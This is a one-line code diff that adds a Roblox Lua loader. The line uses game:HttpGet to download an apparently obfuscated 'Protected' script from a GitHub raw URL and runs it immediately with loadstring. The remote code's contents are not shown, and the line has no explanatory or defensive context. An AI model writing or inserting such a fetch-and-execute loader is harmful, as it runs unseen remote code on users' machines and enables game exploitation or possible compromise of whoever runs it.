@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/FlmesCoding/NexusMainFR/main/Protected_2084810724917298.lua'))()
